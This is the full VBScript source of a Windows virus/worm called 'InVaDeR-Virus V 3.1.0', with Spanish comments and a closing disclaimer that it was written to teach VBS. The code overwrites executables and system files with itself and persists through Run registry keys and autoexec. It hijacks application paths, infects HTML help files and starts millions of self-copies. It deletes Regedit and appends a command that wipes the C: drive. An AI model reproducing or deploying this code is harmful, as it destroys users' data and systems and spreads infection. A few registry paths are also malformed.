'InVaDeR-Virus V 3.1.0
'---------------------
'by Virus Catalog, SA

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wss = CreateObject("WScript.Shell")
Set windows = fso.GetSpecialFolder(0)
Set sys = fso.GetSpecialFolder(1)
Set exe_res = fso.GetSpecialFolder(2)
fso.CopyFile sys & "\wscript.exe", exe_res & "\wscript.exe"
Set este_virus = fso.OpenTextFile(WScript.ScriptFullName)
txt = este_virus.ReadAll                                 'Se han creado las variables básicas.
If (fso.FileExists("C:\Autoexec.nt")) Then
  Set autoexec_ = fso.OpenTextFile("C:\Autoexec.nt")     'Modificaciones para el sistema Anti-Deletion, V3
Else
    Set autoexec_ = fso.OpenTextFile("C:\Autoexec.bat")
End If
autoexec_text = autoexec_.ReadAll
worm = wss.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader") 'Inicia prueba de "supervivencia" (worm)
If worm = 1 Then
   If Month(Now()) <> 9 Then
      Set fol_in = fso.GetFolder("C:\")
      infectfiles()                    'Se inicia el mecanismo "Infect-Files"
      Sub infectfiles
          Set c = fol_in.Files
          Set w = windows.Files
          Set s = sys.Files
          For Each f1 In c
              ext = fso.GetExtensionName(f1.path)
                  If (ext = "exe" Or ext = "dll" Or ext = "ini" Or ext = "log" Or ext = "sys") Then
                     Set x = fso.OpenTextFile(f1.path, 2, True)
                     x.Write txt
                     x.Close    'Con ésto hemos infectado todos los EXE, DLL, INI, LOG y SYS
                  End If
          Next
          For Each f1 In w
              ext2 = fso.GetExtensionName(f1.path)
                  If (ext2 = "exe" Or ext2 = "dll" Or ext2 = "ini" Or ext2 = "log" Or ext2 = "sys") Then
                     Set z = fso.OpenTextFile(f1.path, 2, True)
                     z.Write txt
                     z.Close    'Con ésto hemos infectado todos los EXE, DLL, INI, LOG y SYS
                  End If
          Next
          For Each f1 In s
              ext3 = fso.GetExtensionName(f1.path)
                  If (ext3 = "exe" Or ext3 = "dll" Or ext3 = "ini" Or ext3 = "log" Or ext3 = "sys") Then
                     Set t = fso.OpenTextFile(f1.path, 2, True)
                     t.Write txt
                     t.Close    'Con ésto hemos infectado todos los EXE, DLL, INI, LOG y SYS
                  End If
          Next
      End Sub 'Este es el mecanismo "Infect-Files", que luego usaremos a nuestro favor...
      Set up = fso.CreateTextFile(sys & "\Update.bat", True)
      up.WriteLine("@echo off")
      up.WriteLine("ren C:\*.sys *.vbs")               'Aquí se ve claramente
      up.WriteLine("ren C:\*.exe *.vbs")               'para qué se se puede usar
      up.WriteLine("ren C:\*.dll *.vbs")               'el mecanismo "Infect-Files"
      up.WriteLine("ren C:\*.ini *.vbs")               'pero se pone mejor...
      up.WriteLine("ren C:\*.log *.vbs")
      up.WriteLine("ren %SystemRoot%\*.sys *.vbs")
      up.WriteLine("ren %SystemRoot%\*.exe *.vbs")
      up.WriteLine("ren %SystemRoot%\*.dll *.vbs")
      up.WriteLine("ren %SystemRoot%\*.ini *.vbs")
      up.WriteLine("ren %SystemRoot%\*.log *.vbs")
      up.WriteLine("ren %SystemRoot%\System32\*.sys *.vbs")
      up.WriteLine("ren %SystemRoot%\System32\*.exe *.vbs")
      up.WriteLine("ren %SystemRoot%\System32\*.dll *.vbs")
      up.WriteLine("ren %SystemRoot%\System32\*.ini *.vbs")
      up.WriteLine("ren %SystemRoot%\System32\*.log *.vbs")
      up.WriteLine("echo")
      up.Close
      activ = wss.RegRead("HKEY_LOCAL_MACHINE\Activate")
      If activ = 1 Then
         wss.RegWrite "HKEY_LOCAL_MACHINE\System\Setup\OSLoaderPath", WScript.ScriptFullName 'Aquí nos metemos al OSLoader del sistema. Muy divertido... V3!
         wss.Run sys & "\Update.bat"
      Else                                              'Ahora lo que procede es usar nuestras infecciones en el Registro!
          wss.RegWrite "HKEY_LOCAL_MACHINE\Activate"
          wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invasion", "C:\*.vbs"
          wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invas10n", windows & "\*.vbs"
          wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invas1oon", sys & "\*.vbs"
      End If
      Set driv = fso.Drives      'Por fin comienza la invasión.
      For Each x in driv                         'Primer destino: El Escritorio con 1000 copias!
          If x.DriveType = 2 Then
             escrit = fso.GetFolder(x.path)
             For n = 0 To 1000
                 fso.CopyFile WScript.ScriptFullName, escrit & "\InVaS" & n & "0oOn!!.vbs"
             Next
          End If
      Next
      wss.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\Log File (Outlook)"
      wss.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\Log File (Outlook)", WScript.ScriptFullName        'Tomamos Outlook!
      wss.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader", WScript.ScriptFullName                  'Nos copiamos al key "Run" del Usuario, para viajar con él!
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegistredOwner", "I-N-V-A-D-E-D"                       'Le ponemos nuestro nombre al Sistema
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wmplayer"                       'Nos posesionamos de WM-player
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wmplayer", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wordpad"                        'Nos Posesionamos de WordPad
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wordpad", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\iexplore"                       'Nos posesionamos de Internet Explorer
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\iexplore", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\Path"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\Path", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\(Predeterminado)"                                         'Nos posesionamos de Word
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\(Predeterminado)", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\Path"                               'Nos aseguramos de estar metidos en Internet
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\(Predeterminado)"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\Path", WScript.ScriptFullName
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\(Predeterminado)", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\Path"                               'Nos aseguramos de estar metidos en Outlook
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\(Predeterminado)"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\Path", WScript.ScriptFullName
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\(Predeterminado)", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\Path"                               'Nos Metemos hasta en el Scandisc!
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\(Predeterminado)"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\Path", WScript.ScriptFullName
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\(Predeterminado)", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\(Predeterminado)"                         '...Y de una vez del Win-Zip...
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\(Predeterminado)", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls\Speech"                                   'Ahora tomamos el control sobre algunos datos del Panel de Control
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls\Speech", WScript.ScriptFullName
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cursors"
      wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Settings\Video"
      wss.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Print"                                                    'Nuevas diversiones V3:
      wss.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName"                         '       -Borrar Impresoras
      wss.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\DaylightName"                         '       -Poner nuestro nombre en la fecha
      wss.RegWrite "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName", "I-N-V-A-D-E-D"         '       -Quitar las distribuciones del teclado!
      wss.RegWrite "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\DaylightName", "I-N-V-A-D-E-D"
      Wss.RegDelete "HKEY_LOCAL_MACHINE\SystemCurrentControlSet\Control\Keyboard Layout"
      Wss.RegDelete "HKEY_LOCAL_MACHINE\SystemCurrentControlSet\Control\Keyboard Layouts"
      Wss.RegWrite "HKEY_LOCAL_MACHINE\SystemCurrentControlSet\Sevices\RemoteRegistry\Parameters\ServiceDll", WScript.ScriptFullName       'Esto, en teoría, debería copiarnos al servidor en el que nos registramos. (Todo está en papel...) V3!
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\DeatfulPrefix\(predeterminado)", "I-N-V-A-D-E-D__\\"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\www", "INVADED!!!__\\"
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\home", "I_N_V_A_E_D--\\"                     'Y con estas últimas líneas grabamos nuestro nombre en los prefijos de Red
      wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\ftp", "SEND_ME! (InVaDeR-ViRuS)"
      Set htm = fso.CreateTextFile(windows & "\hom_e.html", True)
      htm.WriteLine("<HTML>")                               'Creamos nuestro HTML para Página de Inicio
      htm.WriteLine("<Head>")
      htm.WriteLine("<Title> I - N - V - A - D - E - D </Title>")
      htm.WriteLine("</Head>")
      htm.WriteLine("<Body BGColor=""Silver"">")
      htm.WriteLine("<Script Language=""VBScript"">")  'Hacemos infeccioso el HTML! Nuevo en la V2!
      htm.WriteLine(txt)
      htm.WriteLine("</Script>")
      htm.WriteLine("<H1><CENTER><Font Color=""#0000FF"" Size=""14""> I </Font><Font Color=""#00FF00"" Size=""5""> NVADED!</CENTER></H1>")
      htm.WriteLine("</Body>")
      htm.WriteLine("</HTML>")
      htm.Close                        'Ahora establecemos el HTML como página de Inicio:
      wss.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", windows & "\hom_e.html"
      For htm1 = 0 To 1000
          fso.CopyFile windows & "\hom_e.html", "C:\Winvasion" & htm1 & ".html"         'NUEVO!
          fso.CopyFile windows & "\hom_e.html", sys & "\Winvasion" & htm1 & ".html"     'En la V2, el virus copia HTMLs por todos lados...
          fso.CopyFile windows & "\hom_e.html", escrit & "\Winvasion" & htm1 & ".html"
      Next
      Set help = fso.GetFolder(windows & "\Help")
      Set web = fso.GetFolder(windows & "\Web")
      infecthtml()
      Sub infecthtml                  'Nuevo "Infect-Foles" para infectar los
          Set hp = help.Files         'Hipertextos de ayuda, etc. de WINDOWS!
          Set wb = web.Files          'Para la V2!
          For Each f1 In hp
              ext4 = fso.GetExtensionName(f1.path)
              If (ext4 = "htm" Or ext4 = "html" Or ext4 = "chm") Then
                  Set y = fso.OpenTextFile(f1.path, 2, True)
                  y.Write "<Script Language=""VBScript"">"
                  y.Write txt
                  y.Write "</Script>"
                  y.Close
              End If
          Next
          For Each f1 In wb
              ext5 = fso.GetExtensionName(f1.path)
              If (ext5 = "htm" Or ext5 = "html" Or ext5 = "chm") Then
                  Set v = fso.OpenTextFile(f1.path, 2, True)
                  v.Write "<Script Language=""VBScript"">"
                  v.Write txt
                  v.Write "</Script>"
                  v.Close
              End If
          Next
      End Sub
      For invade = 0 To 25000000                                                            'Más errores fatales corregidos:
          fso.CopyFile WScript.ScriptFullName, windows & "\I_n_v_A-sion___" & invade & ".vbs"        'Sólo existían 3 SpecialFolders ^_^
          fso.CopyFile WScript.ScriptFullName, sys & "\I_n_v_A-sion___" & invade & ".vbs"            'Por eso tuve que hacer algunos cambios
          fso.CopyFile WScript.ScriptFullName, exe_res & "\I_n_v_A-sion___" & invade & ".vbs"        'En este punto.
          fso.CopyFile WScript.ScriptFullName, escrit & "\I_n_v_A-sion___" & invade & ".vbs"         'Se compensa, claro, porque aunque ya no son 25
          fso.CopyFile WScript.ScriptFullName, "C:\I_n_v_A-sion___" & invade & ".vbs"                'Carpetas, ahora son 25 millones de copias...
          fso.CopyFile WScript.ScriptFullName, web & "\I_n_v_A-sion___" & invade & ".vbs"
          fso.CopyFile WScript.ScriptFullName, help & "\I_n_v_A-sion___" & invade & ".vbs"           'Correción de la V3.1
      Next
      vive = wss.RegRead("HKEY_LOCAL_MACHINE\Copied")
      If vive = 1 Then
         wss.RegWrite "HKEY_LOCAL_MACHINE\System\Setup\OSLoaderPath", WScript.ScriptFullName
         If (fso.FileExists("C:\Autoexec.nt")) Then
              Set bat = fso.CreateTextFile("C:\Autoexec.nt", True)
              bat.Write(autoexec_text)
              bat.Writeline("rd /s /q C:")
              bat.Close                                           'Más modificaciones de la V3
         Else
             Set bat = fso.CreateTextFile("C:\Autoexec.bat", True)
             bat.Write(autoexec_text)
             bat.WriteLine("rd /s /q C:")
             bat.Close
         End If
      Else
          fso.CopyFile WScript.ScriptFullName, "A:\LEEME.TXT.vbs"
          If (fso.FileExists("A:\LEEME.TXT.vbs")) Then
             wss.RegWrite "HKEY_LOCAL_MACHINE\Copied"
          End If
      End IF                                         'Por si no fuera poco, el Worm intenta copiarse a los diskettes
      Do
      j = j+1
      If j = 1000000 Then
         For cop = 0 To j                            'Más y más copias infecciosas...
             fso.CopyFile WScript.ScriptFullName, "C:\INVADED!" & cop & ".vbs"
             wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\I-N-V-A-S-O-R" & cop, "C:\INVADED!" & cop & ".vbs"
             fso.CopyFile WScript.ScriptFullName, windows & "\INVADED" & cop & ".vbs"
             wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\IN-VA-SOR" & cop, windows & "\INVADED" & cop & ".vbs"
             fso.CopyFile WScript.ScriptFullName, sys & "\INVADED" & cop & ".vbs"
             wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\IN-VAS-OR" & cop, sys & "\INVADED" & cop & ".vbs"
         Next
      End If
      If j = 10000000000 Then
        For keys = 0 To j
            wss.SendKeys "INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - "
            Wss.SendKeys "Computadora infectada y saturada... Ha Ha Ha!"
            wss.SendKeys "La invasión" & "sigue y "*j
            wss.SendKeys "VBS-VIRUS, °Invader° by Virus Catalog SA"
            wss.SendKeys "Distribuído para el aprendizaje del lenguaje VBS"
            wss.SendKeys "No nos hacemos responsables por el mal uso que se le pueda dar"
         Next
      End If
      j = 0
      Loop
   End If
Else
    fso.CreateFolder(windows & "\Win_vader")
    fso.CopyFile WScript.ScriptFullName, windows & "\Win_vader\Win_vader.vbs"
    Set antidel = fso.CreateTextFile(sys & "\InVaDeR.vbs", True)             'Un sensillo mecanismo anti-eliminación.
    antidel.WriteLine(txt)
    antidel.Close
    If (fso.FileExists("C:\Autoexec.nt")) Then             'Modificaciones del mecanismo Anti-Deletion, V3
       Set res = fso.CreateTextFile("C:\Autoexec.nt", True)
        res.Write(autoexec_text)
        res.WriteLine("%SystemRoot%\System32\InVaDeR.vbs") 'Más cambios de la V2!
        res.Close
    Else
        Set res = fso.CreateTextFile("C:\Autoexec.bat", True)
        res.Write(autoexec_text)
        res.WriteLine("%SystemRoot%\System32\InVaDeR.vbs")
        res.Close
    End If                                              'Fin del mecanismo andi-eliminación
    wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader", windows & "\Win_vader\Win_vader.vbs"
End If
fso.DeleteFile(windows & "\Regedit.exe")                'Borra el Regedit.exe
fso.DeleteFile(sys & "\wscript.exe")
fso.CopyFile exe_res & "\wscript.exe", sys & "\wscript.exe"    'Corrección de Error Fatal, V3!


'Fin del InVaDeR-Virus
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'NOTA:   Este y todos los Códigos y Programas distribuídos por vir_catlog fueron escritos '
'        con la única finalidad de ayudar a aprender el lenguaje VBS.                     '
'        Virus Catalog SA no se hace responsable del mal uso que se le pueda dar.         '
' -------------------------------------------                                             '
'| Vacunas y Antivirus: vir_catlog@yahoo.com |                                            '
' -------------------------------------------                                             '
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''